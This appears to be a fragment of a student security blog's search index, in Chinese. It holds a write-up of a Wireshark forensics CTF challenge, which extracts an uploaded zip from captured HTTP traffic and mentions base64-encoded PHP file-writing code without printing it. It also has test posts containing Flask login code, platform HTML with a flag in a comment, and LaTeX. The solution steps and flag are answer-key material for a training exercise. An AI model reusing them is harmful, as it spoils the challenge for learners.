","date":"2022-09-27","objectID":"/about/:2:3","tags":null,"title":"关于*","uri":"/about/"},{"categories":null,"content":"AiitCTF方向班平台 wireshark流量分析","date":"2022-09-27","objectID":"/posts/aiitctf-%E6%B5%81%E9%87%8F%E9%9A%90%E5%86%99%E9%A2%98%E8%A7%A3/","tags":["方向班挑战-题解"],"title":"AiitCTF wireshark流量分析题解","uri":"/posts/aiitctf-%E6%B5%81%E9%87%8F%E9%9A%90%E5%86%99%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":"2019年安信工信息安全方向班个人题解合集-1 主要是饭点快到了，我就想着顺手写一下吧 首先我们先打开这题，在这里我其实已经提示了这题是有题解的，再做不来神仙也救不了 下面我们下载该数据包，用wireshark打开查看 当然这么一个一个看实属是费劲，我们右键一下菜单，点击追踪流 选中TCP流 提示 注意那个红色区域以及蓝色区域，那里分别是http请求和返回 根据这个路径我们可以得知这是在进行某种上传操作，而结合数据尾部列举的三个文件 我们注意到，这个压缩包的时间是2018-06-03 10:11:59这个时间出现的，而在上面的通讯数据中也发现其中一条响应体时间也是一样的 更进一步确定了该请求题中包含的十六进制流是该文件的猜想,那么我们就提取这些十六进制，丢到010editor内生成reverse.zip压缩包 得到压缩包文件，二维码的内容也就是flag啦 第二条路 其实观察这个十六进制前的内容，可以猜测是base64的数据，毕竟也是网络中传输所用的常用编码形式 | 可以看出是个php的代码，在写入文件的操作，有php编译器的直接扔过去也能生成 ","date":"2022-09-27","objectID":"/posts/aiitctf-%E6%B5%81%E9%87%8F%E9%9A%90%E5%86%99%E9%A2%98%E8%A7%A3/:1:0","tags":["方向班挑战-题解"],"title":"AiitCTF wireshark流量分析题解","uri":"/posts/aiitctf-%E6%B5%81%E9%87%8F%E9%9A%90%E5%86%99%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":"整个测试玩捏","date":"2022-09-23","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","tags":["tech test"],"title":"我的第一篇博客","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"Hugo好耶 我觉得还行，基本是定居在此了 ","date":"2022-09-23","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/:1:0","tags":["tech test"],"title":"我的第一篇博客","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"测试样式 Test code if user: if user and verify_password(user_password,user.password): oauth2=Oauth2.query.filter_by(email=user.email).first() # print(type(user)) # print(type(oauth2)) #login_user(user) if oauth2: if oauth2.oauth2_Alipay_id==Aliresponse.user_id: login_user(user) else: error_info=\"该支付宝已绑定其他AiitCTF账户\" errors.append(error_info) return render_template('Oauth2/login_ali.html',errors=errors) # return redirect(url_for(\"authalipayConfirmError\",msg=\"doubleAiit\")) Test code2 \u003cbody\u003e \u003cdiv class=\"container\"\u003e \u003cmain role=\"main\"\u003e \u003cdiv class=\"container\"\u003e \u003cdiv class=\"jumbotron bg-transparent mb-0 radius-0\"\u003e \u003cdiv class=\"container\"\u003e \u003cdiv class=\"row\"\u003e \u003cdiv class=\"col-xl-6\"\u003e \u003ch1 class=\"display-3\"\u003e欢迎来到AiitCTF\u003cspan class=\"vim-caret\"\u003e͏͏\u003c/span\u003e\u003c/h1\u003e \u003ch1 class=\"display-3\"\u003e信息安全方向班训练平台\u003cspan class=\"vim-caret\"\u003e͏͏\u0026nbsp;\u003c/span\u003e\u003c/h1\u003e \u003cdiv class=\"lead mb-3 text-mono text-success\"\u003e为一切热爱学习信息安全知识的同学们提供想要的一切！源于书本的知识，用指尖实现 \u003c/div\u003e \u003cdiv class=\"text-mono\"\u003e \u003ca href=\"challenges\" class=\"btn btn-primary btn-shadow px-3 my-2 ml-0 text-left\"\u003e Go! \u003c/a\u003e \u003c/div\u003e \u003cdiv class=\"text-darkgrey text-mono my-2\"\u003e答案即为心之所向\u003c/div\u003e \u003cp class=\"mt-5 text-grey text-spacey\"\u003e 安徽信息工程学院 \u003cbr\u003e 网络信息安全实验室(方向班)维护 \u003cbr\u003e \u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c!-- 全体目光向我看齐，看我看我，我宣布个事 --\u003e \u003c!-- aiit{hello-every-gamer} ---\u003e \u003c/div\u003e \u003c/main\u003e \u003c/body\u003e ","date":"2022-09-23","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/:1:1","tags":["tech test"],"title":"我的第一篇博客","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"媒体测试 还是markdown看着舒服哇 好久没敲tex T_T 试试水，公式块 $$ c = \\pm\\sqrt{a^2 + b^2} $$ 行内公式\\(f(x)=\\int_{-\\infty}^{\\infty} \\hat{f}(\\xi) e^{2 \\pi i \\xi x} d \\xi\\) ","date":"2022-09-23","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/:1:2","tags":["tech test"],"title":"我的第一篇博客","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"}]